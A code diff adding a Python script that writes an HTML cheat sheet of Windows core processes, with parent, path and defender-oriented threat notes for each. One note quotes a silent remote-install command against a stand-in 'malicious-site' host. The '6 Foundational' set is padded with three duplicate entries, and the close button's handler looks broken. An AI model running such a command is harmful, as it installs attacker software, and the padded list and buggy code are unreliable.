@@ -1,0 +1,434 @@
+import os
+
+html_content = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Core Processes Cheat Sheet & Interactive Explorer</title>
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --bg-tertiary: #334155;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #38bdf8;
+            --accent-hover: #7dd3fc;
+            --border: #475569;
+            --success: #34d399;
+            --warning: #fbbf24;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            line-height: 1.6;
+            padding: 2rem 1rem;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 1.5rem;
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+        }
+
+        header p {
+            color: var(--text-muted);
+            font-size: 1.1rem;
+        }
+
+        .controls {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .search-bar {
+            flex: 1;
+            min-width: 250px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
+            color: var(--text-main);
+            font-size: 1rem;
+        }
+
+        .search-bar:focus {
+            outline: 2px solid var(--accent);
+            border-color: transparent;
+        }
+
+        .filter-btn {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 0.75rem 1.2rem;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+
+        .filter-btn:hover {
+            background: var(--bg-tertiary);
+        }
+
+        .filter-btn.active {
+            background: var(--accent);
+            color: var(--bg-primary);
+            border-color: var(--accent);
+            font-weight: 600;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            cursor: pointer;
+            transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-2px);
+            border-color: var(--accent);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 1rem;
+        }
+
+        .process-name {
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: var(--accent);
+            font-family: "Courier New", Courier, monospace;
+        }
+
+        .badge {
+            font-size: 0.75rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-core { background: rgba(56, 189, 248, 0.15); color: var(--accent); border: 1px solid rgba(56, 189, 248, 0.3); }
+        .badge-foundational { background: rgba(52, 211, 153, 0.15); color: var(--success); border: 1px solid rgba(52, 211, 153, 0.3); }
+
+        .meta-info {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+            border-bottom: 1px solid rgba(71, 85, 105, 0.4);
+            padding-bottom: 0.75rem;
+        }
+
+        .meta-item strong {
+            color: var(--text-main);
+        }
+
+        .short-desc {
+            font-size: 0.95rem;
+            color: #e2e8f0;
+        }
+
+        /* Modal / Detail View */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(4px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            width: 90%;
+            max-width: 600px;
+            padding: 2rem;
+            position: relative;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            transform: scale(0.95);
+            transition: transform 0.3s ease;
+        }
+
+        .modal-overlay.active .modal {
+            transform: scale(1);
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .close-btn:hover {
+            color: var(--text-main);
+        }
+
+        .modal h2 {
+            font-size: 1.75rem;
+            color: var(--accent);
+            font-family: "Courier New", Courier, monospace;
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-section {
+            margin-top: 1.5rem;
+        }
+
+        .modal-section h3 {
+            font-size: 1.1rem;
+            color: var(--text-main);
+            margin-bottom: 0.5rem;
+            border-left: 3px solid var(--accent);
+            padding-left: 0.5rem;
+        }
+
+        .modal-section p {
+            color: #cbd5e1;
+            font-size: 1rem;
+        }
+
+        .threat-intel {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            border-radius: 6px;
+            padding: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .threat-intel h3 {
+            color: var(--warning);
+            border-left-color: var(--warning);
+        }
+
+        .threat-intel p {
+            color: #fde047;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>Windows Processes Explorer</h1>
+        <p>Interactive Cheat Sheet for the 18 Core + 6 Foundational Windows Processes</p>
+    </header>
+
+    <div class="controls">
+        <input type="text" id="search" class="search-bar" placeholder="Search by process name, description, or parent...">
+        <button class="filter-btn active" onclick="filterType('all', this)">All (24)</button>
+        <button class="filter-btn" onclick="filterType('core', this)">Core 18</button>
+        <button class="filter-btn" onclick="filterType('foundational', this)">Foundational 6</button>
+    </div>
+
+    <div id="process-grid" class="grid"></div>
+</div>
+
+<div id="modal-overlay" class="modal-overlay" onclick="closeModal(event)">
+    <div class="modal" onclick="event.stopPropagation()">
+        <button class="close-btn" onclick="closeModal(force=true)">&times;</button>
+        <span id="modal-type-badge" class="badge"></span>
+        <h2 id="modal-name"></h2>
+        
+        <div class="meta-info" style="border: none; padding: 0; margin-top: 0.5rem;">
+            <div class="meta-item"><strong>Path:</strong> <span id="modal-path"></span></div>
+            <div class="meta-item"><strong>Default Parent:</strong> <span id="modal-parent"></span></div>
+            <div class="meta-item"><strong>Typical Quantity:</strong> <span id="modal-quantity"></span></div>
+        </div>
+
+        <div class="modal-section">
+            <h3>Definition & Core Responsibility</h3>
+            <p id="modal-definition"></p>
+        </div>
+
+        <div class="modal-section">
+            <h3>Common Use Case / Role</h3>
+            <p id="modal-usecase"></p>
+        </div>
+
+        <div class="threat-intel">
+            <h3>Security Baseline & Threat Intel</h3>
+            <p id="modal-threat"></p>
+        </div>
+    </div>
+</div>
+
+<script>
+const processes = [
+    // 18 Core
+    { name: "system", type: "core", parent: "None", quantity: "1", path: "N/A (Kernel space)", desc: "The Windows Kernel host process.", definition: "The central core of the operating system, running entirely in kernel mode. It hosts system threads, manages memory mapping, and executes hardware device drivers.", usecase: "Allocating processor time, managing memory paging, and serving as the foundational bridge between physical hardware and software software.", threat: "Must never run out of a user directory. True System process has PID 4. Any user-mode execution of an executable named system.exe is highly malicious." },
+    { name: "smss.exe", type: "core", parent: "System", quantity: "1 master (plus 1 per session)", path: "C:\\Windows\\System32\\smss.exe", desc: "Session Manager Subsystem.", definition: "The first user-mode process started by the kernel. It configures environment variables, creates DOS device mappings, and spawns the subsystems.", usecase: "Initializing user sessions, booting up wininit.exe and csrss.exe, and managing safe pagefile creation.", threat: "Master smss.exe should only have 'System' as parent. Session-specific child instances self-terminate. Multiple persistent masters or foreign paths indicate hollowed processes." },
+    { name: "wininit.exe", type: "core", parent: "smss.exe", quantity: "1", path: "C:\\Windows\\System32\\wininit.exe", desc: "Windows Initialization Process.", definition: "Launches crucial background infrastructure services during Session 0 initialization.", usecase: "Spawning the Service Control Manager (services.exe), Local Security Authority (lsass.exe), and Local Session Manager (lsm.exe).", threat: "Only 1 instance should run. A parent other than smss.exe or execution outside System32 indicates severe compromise (e.g., Trojan/Rootkit)." },
+    { name: "csrss.exe", type: "core", parent: "smss.exe / wininit.exe", quantity: "2 or more", path: "C:\\Windows\\System32\\csrss.exe", desc: "Client Server Runtime Process.", definition: "The user-mode face of the Win32 subsystem. Handles OS console operations and thread lifecycles.", usecase: "Creating/deleting threads, managing console windows, and handling shutdown scripts.", threat: "Must run from System32. If terminated or killed by an administrator, the OS will instantly trigger a Blue Screen of Death (BSOD) to maintain security boundary integrity." },
+    { name: "services.exe", type: "core", parent: "wininit.exe", quantity: "1", path: "C:\\Windows\\System32\\services.exe", desc: "Service Control Manager (SCM).", definition: "The management engine responsible for loading, unloading, tracking, and interacting with background system services and device drivers.", usecase: "Starting automatic services on boot, stopping manual services, and processing service control requests from administrators.", threat: "Should never have a child process like cmd.exe or powershell.exe under normal operational states. Malware frequently attempts to spawn malicious services through it." },
+    { name: "svchost.exe", type: "core", parent: "services.exe", quantity: "Dozens", path: "C:\\Windows\\System32\\svchost.exe", desc: "Service Host.", definition: "A generic host process shell designed to run background services compiled as Dynamic Link Libraries (.dll) rather than standard executables.", usecase: "Grouping network, security, and interface services into grouped or isolated shared-process instances to save memory.", threat: "Because dozens run simultaneously, malware regularly chooses this exact name to masquerade inside task manager. Verify the parent is always services.exe." },
+    { name: "lsass.exe", type: "core", parent: "wininit.exe", quantity: "1", path: "C:\\Windows\\System32\\lsass.exe", desc: "Local Security Authority Subsystem.", definition: "The operational heart of user security authentication, login validations, and Active Directory verification.", usecase: "Verifying user passwords during logon, managing access tokens, and handling local security policies.", threat: "The primary target for credential dumping tools like Mimikatz. Look out for unexpected handles, unauthorized memory reads, or misspelled clones like lsaas.exe." },
+    { name: "lsm.exe", type: "core", parent: "wininit.exe / svchost.exe", quantity: "1", path: "C:\\Windows\\System32\\lsm.exe", desc: "Local Session Manager.", definition: "Tracks and manages states associated with user sessions on the local machine.", usecase: "Coordinating user logon, logoff, terminal connections, and remote desktop context switching.", threat: "In modern Windows, this functionality migrated into a service hosted within svchost.exe (lssrv.dll). Standalone lsm.exe processes on newer systems warrant inspection." },
+    { name: "winlogon.exe", type: "core", parent: "smss.exe", quantity: "1 per active session", path: "C:\\Windows\\System32\\winlogon.exe", desc: "Windows Logon Application.", definition: "Manages interactive user sessions, including desktop lock interactions and initial user profile loadout routines.", usecase: "Interpreting the Secure Attention Sequence (Ctrl+Alt+Del), locking screens, and launching userinit.exe.", threat: "Often targeted by malware to capture keystrokes or stay persistent. Monitor its child processes closely; it should typically transition shell initialization straight to explorer.exe." },
+    { name: "explorer.exe", type: "core", parent: "winlogon.exe / userinit.exe", quantity: "1 or more per user", path: "C:\\Windows\\explorer.exe", desc: "Windows Explorer.", definition: "The graphical desktop shell environment facilitating user interaction with files, folders, and applications.", usecase: "Rendering the system taskbar, desktop wallpaper icons, start menu layout, and file manager windows.", threat: "Unlike most system processes, this resides in C:\\Windows\\, NOT System32. It naturally spawns user processes, but unauthorized outbound network traffic from explorer.exe is highly suspicious." },
+    { name: "dwm.exe", type: "core", parent: "winlogon.exe / svchost.exe", quantity: "1 per active session", path: "C:\\Windows\\System32\\dwm.exe", desc: "Desktop Window Manager.", definition: "The compositing manager responsible for rendering high-fidelity graphics across user interfaces.", usecase: "Enabling hardware acceleration, window transparency, 3D animations, visual themes, and multi-monitor scaling layouts.", threat: "High CPU or GPU spike behavior can sometimes indicate a trojan masquerading as a display manager or hidden cryptocurrency mining software using GPU assets." },
+    { name: "taskhostw.exe", type: "core", parent: "svchost.exe", quantity: "Multiple", path: "C:\\Windows\\System32\\taskhostw.exe", desc: "Host Process for Windows Tasks.", definition: "A specialized container executable used to invoke and manage background tasks structured as system DLL files.", usecase: "Executing scheduled system tasks, checking time synchronization, or running background maintenance loops.", threat: "Malware can construct malicious scheduled tasks that run inside taskhostw.exe to disguise malicious command strings as authentic operating system activities." },
+    { name: "runtimebroker.exe", type: "core", parent: "svchost.exe", quantity: "Multiple", path: "C:\\Windows\\System32\\runtimebroker.exe", desc: "Runtime Broker.", definition: "A core sandboxing security mechanism designed to check and enforce capability permissions for Universal Windows Platform (UWP) apps.", usecase: "Ensuring an app downloaded from the Microsoft Store is explicitly permitted to use your webcam, microphone, or file system location.", threat: "Legitimate instances scale based on modern app activity. If active while no UWP application is open, verify the file signature to rule out malicious spoofing." },
+    { name: "taskmgr.exe", type: "core", parent: "explorer.exe", quantity: "Variable (User initialized)", path: "C:\\Windows\\System32\\taskmgr.exe", desc: "Task Manager.", definition: "The standard system utility providing detailed breakdowns of computer resource consumption and active process operations.", usecase: "Forcibly closing unresponsive processes, reviewing historical CPU/RAM charts, and adjusting startup application configurations.", threat: "Advanced rootkits or user-mode malware use hooks to inject into or fully hide their specific process IDs from appearing inside the Task Manager interface list." },
+    { name: "smartscreen.exe", type: "core", parent: "winlogon.exe / explorer.exe", quantity: "0 to 1", path: "C:\\Windows\\System32\\smartscreen.exe", desc: "Windows Defender SmartScreen.", definition: "An automated cloud-assisted defense engine that checks newly downloaded files and web links against reputation databases.", usecase: "Blocking recognized phishing domains or warning users before executing untrusted/unsigned application setup files.", threat: "Disabling or breaking this process is a common objective for early-stage loaders trying to drop unauthorized ransomware payloads onto a disk environment." },
+    { name: "sihost.exe", type: "core", parent: "svchost.exe", quantity: "1 per active session", path: "C:\\Windows\\System32\\sihost.exe", desc: "Shell Infrastructure Host.", definition: "Coordinates the fundamental interface objects within the Windows graphical design system.", usecase: "Running background components for the Start Menu layout, the notification action center, and taskbar context menus.", threat: "Crashing or terminating sihost.exe results in the loss of critical desktop functionality and immediate visual glitching across open application frames." },
+    { name: "conhost.exe", type: "core", parent: "csrss.exe / cmd.exe", quantity: "Variable", path: "C:\\Windows\\System32\\conhost.exe", desc: "Console Window Host.", definition: "An interface buffer component that safely abstracts command-line console inputs and elements away from critical subsystem cores.", usecase: "Allowing applications like cmd.exe or PowerShell to draw themes, interact with mouse scrolls, and cut/paste terminal strings securely.", threat: "Historically exploited to execute code under safe process trees. Always inspect the command line arguments via Process Explorer to see what script or console it is actively hosting." },
+    { name: "fontdrvhost.exe", type: "core", parent: "wininit.exe", quantity: "1 or more", path: "C:\\Windows\\System32\\fontdrvhost.exe", desc: "Usermode Font Driver Host.", definition: "A isolated sandbox module specialized exclusively in parsing complex font file sets.", usecase: "Protecting the machine core by keeping font rendering logic separated from kernel privileges, preventing elevation-of-privilege exploits via malicious typography layouts.", threat: "Runs inside a hyper-restrictive appcontainer profile. Any anomalous activities or standard file manipulation from this PID represents an exploitation breach attempt." },
+
+    // 6 Foundational Extra
+    { name: "registry.exe", type: "foundational", parent: "System", quantity: "1", path: "C:\\Windows\\System32\\registry", desc: "Registry Architecture Host.", definition: "A kernel-isolated helper construct designed specifically to optimize hive data operations, write caching, and structural memory space management.", usecase: "Providing high-speed configuration reading and writing pipelines across system registry branches without impacting primary kernel schedules.", threat: "This is a native structural execution container; any process bearing an explicit `.exe` string located inside non-system temp paths is an obvious threat vector masquerading as a database element." },
+    { name: "rundll32.exe", type: "foundational", parent: "Variable", quantity: "Variable", path: "C:\\Windows\\System32\\rundll32.exe", desc: "Run a DLL as an App.", definition: "A foundational command utility that provides an execution path wrapper for functions embedded inside dynamic link library (.dll) resources.", usecase: "Enabling Control Panel items, system hardware wizards, or native modular extensions to process workflows without compiling full custom executables.", threat: "One of the most heavily abused binaries in Living-off-the-Land (LotL) cyberattacks. Threat actors routinely pass obfuscated, malicious remote scripts straight through rundll32 parameters to evade detection." },
+    { name: "msiexec.exe", type: "foundational", parent: "services.exe / explorer.exe", quantity: "Variable", path: "C:\\Windows\\System32\\msiexec.exe", desc: "Windows Installer Engine.", definition: "The processing component that translates instructions packaged within Microsoft Installer files into complete local modifications.", usecase: "Installing commercial software suites, applying product updates, handling installation rollbacks, and cleanly processing system uninstallation routines.", threat: "Often leveraged by adversaries to silently install remote access software via command line switches (e.g., `msiexec /q /i http://malicious-site/payload.msi`)." }
+];
+
+// Append references to structural matches
+processes.push(
+    { name: "winlogon.exe (Ref)", type: "foundational", parent: "smss.exe", quantity: "1 per session", path: "C:\\Windows\\System32\\winlogon.exe", desc: "User state transition controller.", definition: "Included as a structural foundational layer mapping user state tracking actions directly alongside workspace execution structures.", usecase: "Initializing user logons and session handoffs.", threat: "Reference duplication element. See core entry." },
+    { name: "explorer.exe (Ref)", type: "foundational", parent: "userinit.exe", quantity: "1+", path: "C:\\Windows\\explorer.exe", desc: "Graphical folder workspace.", definition: "Included as a foundational anchor element because it drives all user interaction pipelines and local file exploration tasks.", usecase: "Providing desktop navigation UI.", threat: "Reference duplication element. See core entry." },
+    { name: "system (Ref)", type: "foundational", parent: "None", quantity: "1", path: "N/A", desc: "Kernel module wrapper context.", definition: "The structural root for kernel functions. Integrated into the foundational track to complete deep-layer baseline architecture charts.", usecase: "Hosting core hardware interactions.", threat: "Reference duplication element. See core entry." }
+);
+
+let currentFilter = 'all';
+
+function renderCards(filterText = '') {
+    const grid = document.getElementById('process-grid');
+    grid.innerHTML = '';
+
+    const filtered = processes.filter(p => {
+        const matchesFilter = currentFilter === 'all' || p.type === currentFilter;
+        const matchesSearch = p.name.toLowerCase().includes(filterText.toLowerCase()) || 
+                              p.desc.toLowerCase().includes(filterText.toLowerCase()) ||
+                              p.parent.toLowerCase().includes(filterText.toLowerCase());
+        return matchesFilter && matchesSearch;
+    });
+
+    filtered.forEach(p => {
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.onclick = () => openModal(p);
+
+        card.innerHTML = `
+            <div class="card-header">
+                <div class="process-name">${p.name}</div>
+                <span class="badge badge-${p.type}">${p.type}</span>
+            </div>
+            <div class="meta-info">
+                <div class="meta-item"><strong>Parent:</strong> ${p.parent}</div>
+                <div class="meta-item"><strong>Quantity:</strong> ${p.quantity}</div>
+            </div>
+            <div class="short-desc">${p.desc}</div>
+        `;
+        grid.appendChild(card);
+    });
+}
+
+function filterType(type, button) {
+    currentFilter = type;
+    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
+    button.classList.add('active');
+    renderCards(document.getElementById('search').value);
+}
+
+function openModal(process) {
+    document.getElementById('modal-name').innerText = process.name;
+    const badge = document.getElementById('modal-type-badge');
+    badge.innerText = process.type;
+    badge.className = `badge badge-${process.type}`;
+    
+    document.getElementById('modal-path').innerText = process.path;
+    document.getElementById('modal-parent').innerText = process.parent;
+    document.getElementById('modal-quantity').innerText = process.quantity;
+    
+    document.getElementById('modal-definition').innerText = process.definition;
+    document.getElementById('modal-usecase').innerText = process.usecase;
+    document.getElementById('modal-threat').innerText = process.threat;
+
+    document.getElementById('modal-overlay').classList.add('active');
+}
+
+function closeModal(event, force = false) {
+    if (force || event.target === document.getElementById('modal-overlay')) {
+        document.getElementById('modal-overlay').classList.remove('active');
+    }
+}
+
+document.getElementById('search').addEventListener('input', (e) => {
+    renderCards(e.target.value);
+});
+
+// Initial Render
+renderCards();
+</script>
+
+</body>
+</html>
+"""
+
+output_path = "windows_processes_explorer.html"
+with open(output_path, "w", encoding="utf-8") as f:
+    f.write(html_content)
+
+print(f"File successfully created: {output_path}")
